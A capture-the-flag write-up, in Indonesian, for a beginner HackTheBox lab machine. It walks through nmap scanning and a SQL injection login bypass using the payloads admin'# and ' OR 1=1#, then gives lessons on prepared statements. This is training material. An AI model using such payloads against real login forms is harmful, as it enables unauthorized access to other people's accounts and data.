# Appointment — SQL Injection Login Bypass

**Date:** 2025-05-02
**Platform:** HackTheBox
**Difficulty:** Very Easy
**Category:** Web

---

## Target

Mesin Linux dengan web aplikasi sederhana yang memiliki halaman login. Web server berjalan di port 80 menggunakan Apache. Aplikasi tidak menangani input pengguna dengan aman sehingga rentan terhadap serangan injeksi pada form login.

## Vulnerability

Form login langsung menyambungkan input pengguna ke query SQL tanpa sanitasi atau prepared statement. Karakter khusus seperti tanda kutip tunggal dapat digunakan untuk keluar dari konteks string SQL, dan karakter komentar dapat digunakan untuk memotong sisa query sehingga pengecekan password diabaikan sepenuhnya oleh database.

**Klasifikasi OWASP Top 10 2021:** A03 - Injection

## Tools Used

- Nmap (reconnaissance & port scanning)
- Browser (eksplorasi web aplikasi & eksploitasi)

---

## Exploitation Steps

### Step 1 — Reconnaissance

Langkah pertama adalah memverifikasi koneksi ke mesin target, lalu melakukan scanning untuk mengetahui port dan service apa yang berjalan.

```bash
ping -c 4 10.129.9.16
```

Setelah koneksi terkonfirmasi, lakukan scanning port umum terlebih dahulu:

```bash
nmap 10.129.9.16
```

Kemudian lakukan scanning detail pada port yang ditemukan terbuka:

```bash
nmap -sV -sC -p 80 10.129.9.16
```

**Hasil Nmap:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38
```

Port 80 terbuka dengan service HTTP — langkah logis berikutnya adalah membuka browser ke alamat target.

---

### Step 2 — Enumerasi Web Aplikasi

Buka browser dan akses:

```
http://10.129.9.16
```

Ditemukan halaman login dengan dua field: **username** dan **password**. Ini adalah indikator potensial untuk SQL Injection karena form login biasanya melakukan query ke database untuk memverifikasi kredensial.

Query yang kemungkinan berjalan di server:

```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

---

### Step 3 — Eksploitasi SQL Injection

Karena form login berkomunikasi dengan database menggunakan SQL, kita dapat menyisipkan karakter khusus untuk memanipulasi query.

**Payload yang digunakan di field username:**
```
admin'#
```

**Field password:** diisi bebas (apapun)

**Cara kerja payload:**

Query normal di server:
```sql
SELECT * FROM users WHERE username='admin' AND password='...'
```

Query setelah payload dimasukkan:
```sql
SELECT * FROM users WHERE username='admin'#' AND password='...'
```

Karakter `'` memutus string, lalu `#` mengomentari seluruh sisa query termasuk pengecekan password. Server hanya mengecek apakah user `admin` ada di database — tanpa memverifikasi password sama sekali.

**Alternatif payload jika username tidak diketahui:**
```
' OR 1=1#
```

Query yang terjadi:
```sql
SELECT * FROM users WHERE username='' OR 1=1#' AND password='...'
```

`OR 1=1` selalu bernilai TRUE sehingga kondisi WHERE selalu terpenuhi dan login berhasil tanpa mengetahui username maupun password.

---

### Step 4 — Mendapatkan Flag

Setelah payload berhasil dimasukkan, aplikasi memberikan akses dan menampilkan halaman dengan flag.

---

## Proof

```
Flag: [flag tersimpan di catatan pribadi]
```

---

## Lessons Learned

- Port 80 terbuka dari hasil Nmap selalu menjadi sinyal untuk langsung membuka browser — tidak perlu instruksi eksplisit, ini adalah bagian dari **enumeration mindset**.

- SQL Injection terjadi karena input pengguna langsung digabungkan ke query SQL tanpa sanitasi. Proteksi yang benar menggunakan **prepared statement** atau **ORM** seperti Prisma.

- Karakter `'` digunakan untuk keluar dari konteks string SQL, sedangkan `#` digunakan untuk mengomentari sisa query agar diabaikan oleh MySQL.

- Payload `' OR 1=1#` lebih universal daripada `admin'#` karena tidak memerlukan pengetahuan tentang username yang valid.

- Framework modern seperti Next.js dengan Prisma atau Firebase tidak rentan terhadap SQLi karena query tidak pernah dibangun dari string input pengguna secara langsung.

- Perbedaan SQLi dan XSS: keduanya menggunakan konsep **breaking out of context** dengan karakter khusus, namun SQLi menyerang database sedangkan XSS menyerang browser pengguna.

- Selalu gunakan flag `-sV -sC` saat scanning Nmap untuk mendapatkan informasi versi service yang berguna untuk mencari exploit yang relevan.